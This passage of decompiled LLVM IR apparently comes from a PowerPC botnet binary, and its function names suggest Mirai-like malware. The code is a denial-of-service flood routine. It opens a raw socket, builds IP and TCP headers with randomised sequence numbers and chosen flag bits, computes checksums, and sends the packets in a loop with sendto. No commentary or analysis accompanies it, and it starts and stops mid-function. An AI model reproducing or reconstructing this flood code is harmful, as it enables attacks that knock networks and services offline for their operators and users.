dec_label_pc_10003ad4:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10003ae0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-136, align 4
  store i32 268450544, i32* @lr, align 4
  %v5_10003aec = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_10003ae0, i32 4, i32 4)
  store i32 %v5_10003aec, i32* %r3.global-to-local, align 4
  %v3_10003af0 = icmp eq i32 %v5_10003aec, -1
  store i1 %v3_10003af0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003af0, label %dec_label_pc_10003edc, label %dec_label_pc_10003af8

dec_label_pc_10003af8:                            ; preds = %dec_label_pc_10003ad4
  %v0_10003af8 = load i32, i32* %r17.global-to-local, align 4
  %v3_10003af8 = icmp eq i32 %v0_10003af8, 0
  store i1 %v3_10003af8, i1* %cr7_eq.global-to-local, align 1
  %v0_10003afc = load i32, i32* %r14.global-to-local, align 4
  %v1_10003afc = urem i32 %v0_10003afc, 65536
  store i32 %v1_10003afc, i32* %r14.global-to-local, align 4
  %v0_10003b00 = load i32, i32* %r15.global-to-local, align 4
  %v1_10003b00 = urem i32 %v0_10003b00, 65536
  store i32 %v1_10003b00, i32* %r15.global-to-local, align 4
  %v0_10003b04 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003b04 = urem i32 %v0_10003b04, 65536
  store i32 %v1_10003b04, i32* %r16.global-to-local, align 4
  %v0_10003b08 = call i32 @__asm_mfcr()
  store i32 %v0_10003b08, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-136, align 4
  %v0_10003b1c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003b1c, label %dec_label_pc_10003c4c, label %dec_label_pc_10003b20

dec_label_pc_10003b20:                            ; preds = %dec_label_pc_10003af8
  %v0_10003b24 = load i32, i32* %r23.global-to-local, align 4
  %v1_10003b24 = urem i32 %v0_10003b24, 256
  store i32 %v1_10003b24, i32* %r9.global-to-local, align 4
  %v3_10003b28 = icmp eq i32 %v1_10003b24, 0
  store i1 %v3_10003b28, i1* %cr4_eq.global-to-local, align 1
  %v0_10003b2c = load i32, i32* %r21.global-to-local, align 4
  %v1_10003b2c = urem i32 %v0_10003b2c, 2
  store i32 %v1_10003b2c, i32* %r21.global-to-local, align 4
  %v3_10003b30 = icmp eq i32 %v1_10003954, 0
  store i1 %v3_10003b30, i1* %cr3_eq.global-to-local, align 1
  %v0_10003b34 = load i32, i32* @r30, align 4
  %v1_10003b34 = add i32 %v0_10003b34, 40
  store i32 %v1_10003b34, i32* %r0.global-to-local, align 4
  %v0_10003b38 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003b38 = urem i32 %v0_10003b38, 2
  store i32 %v1_10003b38, i32* %r22.global-to-local, align 4
  %v0_10003b3c = load i32, i32* %r24.global-to-local, align 4
  %v1_10003b3c = urem i32 %v0_10003b3c, 2
  %v0_10003b40 = load i32, i32* %r25.global-to-local, align 4
  %v1_10003b40 = urem i32 %v0_10003b40, 2
  %v0_10003b44 = load i32, i32* %r26.global-to-local, align 4
  %v1_10003b44 = urem i32 %v0_10003b44, 2
  %v1_10003b48 = urem i32 %v1_10003b34, 65536
  store i32 %v1_10003b48, i32* @r27, align 4
  %v1_10003b4c = urem i32 %v0_10003b24, 2
  store i32 %v1_10003b4c, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v4_10003ba8 = sext i8 %v5_1000390c to i32
  br label %dec_label_pc_10003b54

dec_label_pc_10003b54:                            ; preds = %dec_label_pc_10003c2c, %dec_label_pc_10003b20
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268450656, i32* @lr, align 4
  %v2_10003b5c = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_10003b5c, i32* %r3.global-to-local, align 4
  %v3_10003b60 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003b60, i32* %r9.global-to-local, align 4
  %v0_10003b64 = load i32, i32* @r29, align 4
  %v1_10003b64 = mul i32 %v0_10003b64, 4
  store i32 %v1_10003b64, i32* %r0.global-to-local, align 4
  %v1_10003b6c = load i32, i32* %r18.global-to-local, align 4
  %v3_10003b6c = add i32 %v1_10003b6c, %v1_10003b64
  %v4_10003b6c = inttoptr i32 %v3_10003b6c to i32*
  store i32 %v2_10003b5c, i32* %v4_10003b6c, align 4
  %v0_10003b70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003b70 = mul i32 %v0_10003b70, 24
  store i32 %v1_10003b70, i32* %r11.global-to-local, align 4
  %v1_10003b74 = mul i32 %v0_10003b70, 4
  store i32 %v1_10003b74, i32* %r9.global-to-local, align 4
  %v1_10003b78 = load i32, i32* %r18.global-to-local, align 4
  %v2_10003b78 = add i32 %v1_10003b78, %v1_10003b74
  %v3_10003b78 = inttoptr i32 %v2_10003b78 to i32*
  %v4_10003b78 = load i32, i32* %v3_10003b78, align 4
  store i32 %v4_10003b78, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10003b80 = load i32, i32* @r31, align 4
  %v2_10003b80 = add i32 %v1_10003b80, %v1_10003b70
  store i32 %v2_10003b80, i32* %r11.global-to-local, align 4
  %v1_10003b84 = inttoptr i32 %v4_10003b78 to i32*
  %v2_10003b84 = load i32, i32* %v1_10003b84, align 4
  store i32 %v2_10003b84, i32* %r0.global-to-local, align 4
  %v1_10003b88 = add i32 %v4_10003b78, 20
  store i32 %v1_10003b88, i32* @r29, align 4
  %v0_10003b8c = load i32, i32* %r20.global-to-local, align 4
  %v1_10003b8c = trunc i32 %v0_10003b8c to i8
  %v3_10003b8c = add i32 %v4_10003b78, 8
  %v4_10003b8c = inttoptr i32 %v3_10003b8c to i8*
  store i8 %v1_10003b8c, i8* %v4_10003b8c, align 1
  %v0_10003b90 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003b90 = add i32 %v0_10003b90, 40
  store i32 %v1_10003b90, i32* @r28, align 4
  %v1_10003b94 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003b94, i32* %r0.global-to-local, align 4
  %v0_10003b98 = load i32, i32* %r14.global-to-local, align 4
  %v1_10003b98 = trunc i32 %v0_10003b98 to i16
  %v2_10003b98 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003b98 = add i32 %v2_10003b98, 4
  %v4_10003b98 = inttoptr i32 %v3_10003b98 to i16*
  store i16 %v1_10003b98, i16* %v4_10003b98, align 2
  %v1_10003b9c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10003ba0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10003ba0 = inttoptr i32 %v1_10003ba0 to i32*
  store i32 %v1_10003b9c, i32* %v2_10003ba0, align 4
  %v0_10003ba4 = load i32, i32* @r27, align 4
  %v1_10003ba4 = trunc i32 %v0_10003ba4 to i16
  %v2_10003ba4 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003ba4 = add i32 %v2_10003ba4, 2
  %v4_10003ba4 = inttoptr i32 %v3_10003ba4 to i16*
  store i16 %v1_10003ba4, i16* %v4_10003ba4, align 2
  store i32 %v4_10003ba8, i32* %r0.global-to-local, align 4
  %v2_10003bac = load i32, i32* %r10.global-to-local, align 4
  %v3_10003bac = add i32 %v2_10003bac, 1
  %v4_10003bac = inttoptr i32 %v3_10003bac to i8*
  store i8 %v5_1000390c, i8* %v4_10003bac, align 1
  %v0_10003bb0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003bb0, label %dec_label_pc_10003bbc, label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b54
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10003bb8 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003bb8 = add i32 %v2_10003bb8, 6
  %v4_10003bb8 = inttoptr i32 %v3_10003bb8 to i16*
  store i16 16384, i16* %v4_10003bb8, align 2
  br label %dec_label_pc_10003bbc

dec_label_pc_10003bbc:                            ; preds = %dec_label_pc_10003b54, %dec_label_pc_10003bb4
  store i32 6, i32* %r0.global-to-local, align 4
  %v0_10003bc0 = load i32, i32* %r15.global-to-local, align 4
  %v1_10003bc0 = trunc i32 %v0_10003bc0 to i16
  %v2_10003bc0 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003bc0 = add i32 %v2_10003bc0, 20
  %v4_10003bc0 = inttoptr i32 %v3_10003bc0 to i16*
  store i16 %v1_10003bc0, i16* %v4_10003bc0, align 2
  %v0_10003bc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003bc4 = trunc i32 %v0_10003bc4 to i8
  %v2_10003bc4 = load i32, i32* %r10.global-to-local, align 4
  %v3_10003bc4 = add i32 %v2_10003bc4, 9
  %v4_10003bc4 = inttoptr i32 %v3_10003bc4 to i8*
  store i8 %v1_10003bc4, i8* %v4_10003bc4, align 1
  %v0_10003bc8 = load i32, i32* %r16.global-to-local, align 4
  %v1_10003bc8 = trunc i32 %v0_10003bc8 to i16
  %v2_10003bc8 = load i32, i32* @r29, align 4
  %v3_10003bc8 = add i32 %v2_10003bc8, 2
  %v4_10003bc8 = inttoptr i32 %v3_10003bc8 to i16*
  store i16 %v1_10003bc8, i16* %v4_10003bc8, align 2
  store i32 %v6_10003aa0, i32* %r9.global-to-local, align 4
  %v1_10003bd0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10003bd0 = add i32 %v1_10003bd0, 12
  %v3_10003bd0 = inttoptr i32 %v2_10003bd0 to i32*
  store i32 %v6_10003aa0, i32* %v3_10003bd0, align 4
  %v0_10003bd4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003bd4 = add i32 %v0_10003bd4, 16
  %v2_10003bd4 = inttoptr i32 %v1_10003bd4 to i32*
  %v3_10003bd4 = load i32, i32* %v2_10003bd4, align 4
  %v1_10003bd8 = load i32, i32* %r10.global-to-local, align 4
  %v2_10003bd8 = add i32 %v1_10003bd8, 16
  %v3_10003bd8 = inttoptr i32 %v2_10003bd8 to i32*
  store i32 %v3_10003bd4, i32* %v3_10003bd8, align 4
  store i32 %v5_100039a4, i32* %r0.global-to-local, align 4
  %v1_10003be0 = load i32, i32* @r29, align 4
  %v2_10003be0 = add i32 %v1_10003be0, 4
  %v3_10003be0 = inttoptr i32 %v2_10003be0 to i32*
  store i32 %v5_100039a4, i32* %v3_10003be0, align 4
  %v0_10003be4 = load i32, i32* @r29, align 4
  %v1_10003be4 = add i32 %v0_10003be4, 12
  %v2_10003be4 = inttoptr i32 %v1_10003be4 to i32*
  %v3_10003be4 = load i32, i32* %v2_10003be4, align 4
  store i32 %v3_10003be4, i32* %r0.global-to-local, align 4
  %v1_10003be8 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10003be8, i32* %r0.global-to-local, align 4
  %v1_10003bec = call i32 @__asm_rlwimi(i32 %v1_10003b2c, i32 21, i32 10, i32 10)
  store i32 %v1_10003bec, i32* %r0.global-to-local, align 4
  %v1_10003bf0 = call i32 @__asm_rlwimi(i32 %v1_10003b38, i32 20, i32 11, i32 11)
  store i32 %v1_10003bf0, i32* %r0.global-to-local, align 4
  %v1_10003bf4 = call i32 @__asm_rlwimi(i32 %v1_10003b4c, i32 19, i32 12, i32 12)
  store i32 %v1_10003bf4, i32* %r0.global-to-local, align 4
  %v1_10003bf8 = call i32 @__asm_rlwimi(i32 %v1_10003b3c, i32 18, i32 13, i32 13)
  store i32 %v1_10003bf8, i32* %r0.global-to-local, align 4
  %v1_10003bfc = call i32 @__asm_rlwimi(i32 %v1_10003b40, i32 17, i32 14, i32 14)
  store i32 %v1_10003bfc, i32* %r0.global-to-local, align 4
  %v1_10003c00 = call i32 @__asm_rlwimi(i32 %v1_10003b44, i32 16, i32 15, i32 15)
  store i32 %v1_10003c00, i32* %r0.global-to-local, align 4
  %v1_10003c04 = load i32, i32* @r29, align 4
  %v2_10003c04 = add i32 %v1_10003c04, 12
  %v3_10003c04 = inttoptr i32 %v2_10003c04 to i32*
  store i32 %v1_10003c00, i32* %v3_10003c04, align 4
  %v0_10003c08 = call i32 @rand_next()
  %v1_10003c08 = trunc i32 %v0_10003c08 to i16
  %v0_10003c0c = load i32, i32* @r30, align 4
  store i32 %v0_10003c0c, i32* @r4, align 4
  %v3_10003c10 = load i32, i32* @r29, align 4
  %v4_10003c10 = add i32 %v3_10003c10, 14
  %v5_10003c10 = inttoptr i32 %v4_10003c10 to i16*
  store i16 %v1_10003c08, i16* %v5_10003c10, align 2
  %v0_10003c14 = load i32, i32* @r28, align 4
  store i32 %v0_10003c14, i32* @r3, align 4
  %v0_10003c18 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003c18, label %dec_label_pc_10003c2c, label %dec_label_pc_10003c1c

dec_label_pc_10003c1c:                            ; preds = %dec_label_pc_10003bbc
  %v0_10003c1c = load i32, i32* @r29, align 4
  %v1_10003c1c = add i32 %v0_10003c1c, 12
  %v2_10003c1c = inttoptr i32 %v1_10003c1c to i32*
  %v3_10003c1c = load i32, i32* %v2_10003c1c, align 4
  store i32 %v3_10003c1c, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10003c24 = call i32 @__asm_rlwimi(i32 1, i32 19, i32 12, i32 12)
  store i32 %v1_10003c24, i32* %r9.global-to-local, align 4
  %v1_10003c28 = load i32, i32* @r29, align 4
  %v2_10003c28 = add i32 %v1_10003c28, 12
  %v3_10003c28 = inttoptr i32 %v2_10003c28 to i32*
  store i32 %v1_10003c24, i32* %v3_10003c28, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003bbc, %dec_label_pc_10003c1c
  store i32 ptrtoint (i32* @global_var_10003c30.83 to i32), i32* @lr, align 4
  %v0_10003c2c = call i32 @rand_alphastr()
  store i32 %v0_10003c2c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10003c34 = load i32, i32* @r28, align 4
  %v2_10003c34 = load i32, i32* @r30, align 4
  %v4_10003c34 = add i32 %v2_10003c34, %v1_10003c34
  %v5_10003c34 = inttoptr i32 %v4_10003c34 to i8*
  store i8 0, i8* %v5_10003c34, align 1
  %v3_10003c38 = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003c38, i32* %r9.global-to-local, align 4
  %v1_10003c3c = add i32 %v3_10003c38, 1
  store i32 %v1_10003c3c, i32* %r29.global-to-local, align 4
  %v1_10003c40 = load i32, i32* %r17.global-to-local, align 4
  %v2_10003c40 = icmp slt i32 %v1_10003c3c, %v1_10003c40
  %v4_10003c40 = icmp eq i32 %v1_10003c3c, %v1_10003c40
  store i1 %v4_10003c40, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003c3c, i32* %stack_var_-136, align 4
  br i1 %v2_10003c40, label %dec_label_pc_10003b54, label %dec_label_pc_10003c4c

dec_label_pc_10003c4c:                            ; preds = %dec_label_pc_10003c2c, %dec_label_pc_10003af8
  store i32 65535, i32* %r0.global-to-local, align 4
  %v0_10003c58 = load i32, i32* @r30, align 4
  %v1_10003c58 = add i32 %v0_10003c58, 40
  store i32 %v1_10003c58, i32* @r26, align 4
  %v4_10003c5c = icmp eq i32 %v5_100039c0, 65535
  store i1 %v4_10003c5c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v6_10003aa0, i32* %r9.global-to-local, align 4
  %v0_10003c64 = load i32, i32* %r15.global-to-local, align 4
  %v4_10003c64 = icmp eq i32 %v0_10003c64, 65535
  store i1 %v4_10003c64, i1* %cr2_eq.global-to-local, align 1
  %v0_10003c68 = load i32, i32* %r16.global-to-local, align 4
  %v4_10003c68 = icmp eq i32 %v0_10003c68, 65535
  store i1 %v4_10003c68, i1* %cr3_eq.global-to-local, align 1
  %v0_10003c6c = call i32 @__asm_mfcr()
  store i32 %v0_10003c6c, i32* %r3.global-to-local, align 4
  %v1_10003c70 = mul i32 %v0_10003c6c, 268435456
  store i32 %v1_10003c70, i32* %r20.global-to-local, align 4
  %v0_10003c74 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003c74 = icmp eq i32 %v0_10003c74, -1
  store i1 %v3_10003c74, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003a8c, i32* %r9.global-to-local, align 4
  %v0_10003c7c = call i32 @__asm_mfcr()
  store i32 %v0_10003c7c, i32* %r3.global-to-local, align 4
  %v1_10003c80 = mul i32 %v0_10003c7c, 268435456
  store i32 %v1_10003c80, i32* %r21.global-to-local, align 4
  %v0_10003c84 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003c84 = icmp eq i32 %v0_10003c84, 0
  store i1 %v3_10003c84, i1* %cr7_eq.global-to-local, align 1
  store i32 %v5_100039a4, i32* %r9.global-to-local, align 4
  %v0_10003c8c = call i32 @__asm_mfcr()
  store i32 %v0_10003c8c, i32* %r3.global-to-local, align 4
  %v1_10003c90 = mul i32 %v0_10003c8c, 268435456
  store i32 %v1_10003c90, i32* %r22.global-to-local, align 4
  %v0_10003c94 = load i32, i32* %r14.global-to-local, align 4
  %v1_10003c94 = load i32, i32* %r0.global-to-local, align 4
  %v4_10003c94 = icmp eq i32 %v0_10003c94, %v1_10003c94
  store i1 %v4_10003c94, i1* %cr7_eq.global-to-local, align 1
  %v0_10003c98 = load i32, i32* %r9.global-to-local, align 4
  %v4_10003c98 = icmp eq i32 %v0_10003c98, %v1_10003c94
  store i1 %v4_10003c98, i1* %cr4_eq.global-to-local, align 1
  %v0_10003c9c = load i32, i32* @r30, align 4
  %v1_10003c9c = add i32 %v0_10003c9c, 20
  store i32 %v1_10003c9c, i32* %r9.global-to-local, align 4
  %v0_10003ca0 = call i32 @__asm_mfcr()
  store i32 %v0_10003ca0, i32* %r3.global-to-local, align 4
  %v1_10003ca4 = mul i32 %v0_10003ca0, 268435456
  store i32 %v1_10003ca4, i32* %r23.global-to-local, align 4
  %v0_10003ca8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003ca8 = urem i32 %v0_10003ca8, 65536
  store i32 %v1_10003ca8, i32* @r24, align 4
  store i32 %v0_10003ca8, i32* @r25, align 4
  %v2_10003cbc = urem i32 %v0_10003b08, 16
  %v1_10003cc4 = mul i32 %v0_10003b08, 268435456
  br label %dec_label_pc_10003cb0

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003db0, %dec_label_pc_10003c4c
  store i32 0, i32* %stack_var_-136, align 4
  store i32 %v2_10003cbc, i32* %r0.global-to-local, align 4
  %v1_10003cc0 = call %0 @__asm_mtcrf(i32 1, i32 %v2_10003cbc)
  store i32 %v1_10003cc4, i32* %r0.global-to-local, align 4
  %v0_10003cc8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003cc8, label %dec_label_pc_10003db0, label %dec_label_pc_10003ccc

dec_label_pc_10003ccc:                            ; preds = %dec_label_pc_10003cb0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10003cd0

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003d3c, %dec_label_pc_10003ccc
  %v0_10003cd0 = phi i32 [ %v1_10003da0, %dec_label_pc_10003d3c ], [ 0, %dec_label_pc_10003ccc ]
  %v1_10003cd0 = mul i32 %v0_10003cd0, 24
  store i32 %v1_10003cd0, i32* %r0.global-to-local, align 4
  %v1_10003cd4 = mul i32 %v0_10003cd0, 4
  store i32 %v1_10003cd4, i32* %r11.global-to-local, align 4
  %v1_10003cd8 = load i32, i32* %r18.global-to-local, align 4
  %v2_10003cd8 = add i32 %v1_10003cd8, %v1_10003cd4
  %v3_10003cd8 = inttoptr i32 %v2_10003cd8 to i32*
  %v4_10003cd8 = load i32, i32* %v3_10003cd8, align 4
  store i32 %v4_10003cd8, i32* @r28, align 4
  %v1_10003cdc = load i32, i32* @r31, align 4
  %v2_10003cdc = add i32 %v1_10003cdc, %v1_10003cd0
  store i32 %v2_10003cdc, i32* %r10.global-to-local, align 4
  %v1_10003ce0 = add i32 %v2_10003cdc, 20
  %v2_10003ce0 = inttoptr i32 %v1_10003ce0 to i8*
  %v3_10003ce0 = load i8, i8* %v2_10003ce0, align 1
  %v4_10003ce0 = zext i8 %v3_10003ce0 to i32
  store i32 %v4_10003ce0, i32* %r9.global-to-local, align 4
  %v1_10003ce4 = add i32 %v4_10003cd8, 20
  store i32 %v1_10003ce4, i32* @r27, align 4
  %v3_10003ce8 = icmp eq i8 %v3_10003ce0, 31
  store i1 %v3_10003ce8, i1* %cr7_eq.global-to-local, align 1
  %tmp33 = icmp ult i8 %v3_10003ce0, 32
  br i1 %tmp33, label %dec_label_pc_10003e9c, label %dec_label_pc_10003cf0

dec_label_pc_10003cf0:                            ; preds = %dec_label_pc_10003cd0
  %v0_10003cf0 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003cf0 = mul i32 %v0_10003cf0, 16
  %v2_10003cf0 = udiv i32 %v0_10003cf0, 268435456
  %v3_10003cf0 = or i32 %v2_10003cf0, %v1_10003cf0
  store i32 %v3_10003cf0, i32* %r21.global-to-local, align 4
  %v1_10003cf4 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003cf0)
  %v1_10003cf8 = mul nuw i32 %v2_10003cf0, 268435456
  %v2_10003cf8 = urem i32 %v0_10003cf0, 268435456
  %v3_10003cf8 = or i32 %v1_10003cf8, %v2_10003cf8
  store i32 %v3_10003cf8, i32* %r21.global-to-local, align 4
  %v0_10003cfc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003cfc, label %dec_label_pc_10003ed0, label %dec_label_pc_10003d00

dec_label_pc_10003d00:                            ; preds = %dec_label_pc_10003e9c, %dec_label_pc_10003cf0, %dec_label_pc_10003ed0
  %v0_10003d00 = load i32, i32* %r23.global-to-local, align 4
  %v1_10003d00 = mul i32 %v0_10003d00, 16
  %v2_10003d00 = udiv i32 %v0_10003d00, 268435456
  %v3_10003d00 = or i32 %v2_10003d00, %v1_10003d00
  store i32 %v3_10003d00, i32* %r23.global-to-local, align 4
  %v1_10003d04 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003d00)
  %v1_10003d08 = mul nuw i32 %v2_10003d00, 268435456
  %v2_10003d08 = urem i32 %v0_10003d00, 268435456
  %v3_10003d08 = or i32 %v1_10003d08, %v2_10003d08
  store i32 %v3_10003d08, i32* %r23.global-to-local, align 4
  %v0_10003d0c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003d0c, label %dec_label_pc_10003e8c, label %dec_label_pc_10003d10

dec_label_pc_10003d10:                            ; preds = %dec_label_pc_10003d00
  %v0_10003d10 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003d10, label %dec_label_pc_10003e7c, label %dec_label_pc_10003d14

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003e8c, %dec_label_pc_10003d10
  %v0_10003d14 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003d14, label %dec_label_pc_10003e24, label %dec_label_pc_10003d18

dec_label_pc_10003d18:                            ; preds = %dec_label_pc_10003e7c, %dec_label_pc_10003d14
  %v0_10003d18 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003d18, label %dec_label_pc_10003e30, label %dec_label_pc_10003d1c

dec_label_pc_10003d1c:                            ; preds = %dec_label_pc_10003e24, %dec_label_pc_10003d18
  %v0_10003d1c = load i32, i32* %r20.global-to-local, align 4
  %v1_10003d1c = mul i32 %v0_10003d1c, 16
  %v2_10003d1c = udiv i32 %v0_10003d1c, 268435456
  %v3_10003d1c = or i32 %v2_10003d1c, %v1_10003d1c
  store i32 %v3_10003d1c, i32* %r20.global-to-local, align 4
  %v1_10003d20 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003d1c)
  %v1_10003d24 = mul nuw i32 %v2_10003d1c, 268435456
  %v2_10003d24 = urem i32 %v0_10003d1c, 268435456
  %v3_10003d24 = or i32 %v1_10003d24, %v2_10003d24
  store i32 %v3_10003d24, i32* %r20.global-to-local, align 4
  %v0_10003d28 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003d28, label %dec_label_pc_10003e48, label %dec_label_pc_10003d2c

dec_label_pc_10003d2c:                            ; preds = %dec_label_pc_10003e30, %dec_label_pc_10003d1c
  %v0_10003d2c = load i32, i32* %r22.global-to-local, align 4
  %v1_10003d2c = mul i32 %v0_10003d2c, 16
  %v2_10003d2c = udiv i32 %v0_10003d2c, 268435456
  %v3_10003d2c = or i32 %v2_10003d2c, %v1_10003d2c
  store i32 %v3_10003d2c, i32* %r22.global-to-local, align 4
  %v1_10003d30 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10003d2c)
  %v1_10003d34 = mul nuw i32 %v2_10003d2c, 268435456
  %v2_10003d34 = urem i32 %v0_10003d2c, 268435456
  %v3_10003d34 = or i32 %v1_10003d34, %v2_10003d34
  store i32 %v3_10003d34, i32* %r22.global-to-local, align 4
  %v0_10003d38 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003d38, label %dec_label_pc_10003d3c, label %dec_label_pc_10003e60

dec_label_pc_10003d3c:                            ; preds = %dec_label_pc_10003d2c, %dec_label_pc_10003e48, %dec_label_pc_10003e60
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10003d44 = load i32, i32* @r28, align 4
  %v3_10003d44 = add i32 %v2_10003d44, 10
  %v4_10003d44 = inttoptr i32 %v3_10003d44 to i16*
  store i16 0, i16* %v4_10003d44, align 2
  %v0_10003d48 = load i32, i32* @r28, align 4
  store i32 %v0_10003d48, i32* @r3, align 4
  %v2_10003d4c = call i32 @checksum_generic(i32 %v0_10003d48, i32 20)
  %v3_10003d4c = trunc i32 %v2_10003d4c to i16
  %v0_10003d50 = load i32, i32* @r27, align 4
  store i32 %v0_10003d50, i32* @r4, align 4
  %v3_10003d54 = load i32, i32* @r28, align 4
  %v4_10003d54 = add i32 %v3_10003d54, 10
  %v5_10003d54 = inttoptr i32 %v4_10003d54 to i16*
  store i16 %v3_10003d4c, i16* %v5_10003d54, align 2
  %v0_10003d58 = load i32, i32* @r24, align 4
  %v0_10003d5c = load i32, i32* %r29.global-to-local, align 4
  %v1_10003d5c = trunc i32 %v0_10003d5c to i16
  %v2_10003d5c = load i32, i32* @r27, align 4
  %v3_10003d5c = add i32 %v2_10003d5c, 16
  %v4_10003d5c = inttoptr i32 %v3_10003d5c to i16*
  store i16 %v1_10003d5c, i16* %v4_10003d5c, align 2
  %v0_10003d60 = load i32, i32* @r25, align 4
  %v0_10003d64 = load i32, i32* @r28, align 4
  store i32 %v0_10003d64, i32* %r3.global-to-local, align 4
  %v4_10003d68 = call i32 @checksum_tcpudp(i32 %v0_10003d64, i32 %v0_10003d50, i32 %v0_10003d58, i32 %v0_10003d60)
  %v5_10003d68 = trunc i32 %v4_10003d68 to i16
  store i32 %v4_10003d68, i32* %r3.global-to-local, align 4
  %v3_10003d6c = load i32, i32* %stack_var_-136, align 4
  store i32 %v3_10003d6c, i32* %r7.global-to-local, align 4
  %v0_10003d70 = load i32, i32* @r27, align 4
  %v1_10003d70 = add i32 %v0_10003d70, 2
  %v2_10003d70 = inttoptr i32 %v1_10003d70 to i16*
  %v3_10003d70 = load i16, i16* %v2_10003d70, align 2
  %v4_10003d70 = zext i16 %v3_10003d70 to i32
  store i32 %v4_10003d70, i32* %r0.global-to-local, align 4
  %v0_10003d74 = load i32, i32* @r28, align 4
  %v1_10003d78 = mul i32 %v3_10003d6c, 24
  store i32 %v1_10003d78, i32* %r7.global-to-local, align 4
  %v4_10003d7c = add i32 %v0_10003d70, 16
  %v5_10003d7c = inttoptr i32 %v4_10003d7c to i16*
  store i16 %v5_10003d68, i16* %v5_10003d7c, align 2
  %v0_10003d80 = load i32, i32* @r26, align 4
  %v0_10003d84 = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10003d84, i32* %r3.global-to-local, align 4
  %v0_10003d88 = load i32, i32* %r7.global-to-local, align 4
  %v1_10003d88 = load i32, i32* @r31, align 4
  %v2_10003d88 = add i32 %v1_10003d88, %v0_10003d88
  store i32 %v2_10003d88, i32* %r7.global-to-local, align 4
  %v0_10003d90 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003d90 = trunc i32 %v0_10003d90 to i16
  %v3_10003d90 = add i32 %v2_10003d88, 2
  %v4_10003d90 = inttoptr i32 %v3_10003d90 to i16*
  store i16 %v1_10003d90, i16* %v4_10003d90, align 2
  store i32 268451228, i32* @lr, align 4
  %v6_10003d98 = call i32 @__libc_sendto(i32 %v0_10003d84, i32 %v0_10003d74, i32 %v0_10003d80, i32 16384, i32 %v2_10003d88, i32 16)
  store i32 %v6_10003d98, i32* %r3.global-to-local, align 4
  %v3_10003d9c = load i32, i32* %stack_var_-136, align 4
  %v1_10003da0 = add i32 %v3_10003d9c, 1
  store i32 %v1_10003da0, i32* %r9.global-to-local, align 4
  %v1_10003da4 = load i32, i32* %r17.global-to-local, align 4
  %v2_10003da4 = icmp slt i32 %v1_10003da0, %v1_10003da4
  %v4_10003da4 = icmp eq i32 %v1_10003da0, %v1_10003da4
  store i1 %v4_10003da4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003da0, i32* %stack_var_-136, align 4
  br i1 %v2_10003da4, label %dec_label_pc_10003cd0, label %dec_label_pc_10003db0

dec_label_pc_10003db0:                            ; preds = %dec_label_pc_10003d3c, %dec_label_pc_10003cb0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003db4 = call i32 @__GI_time()
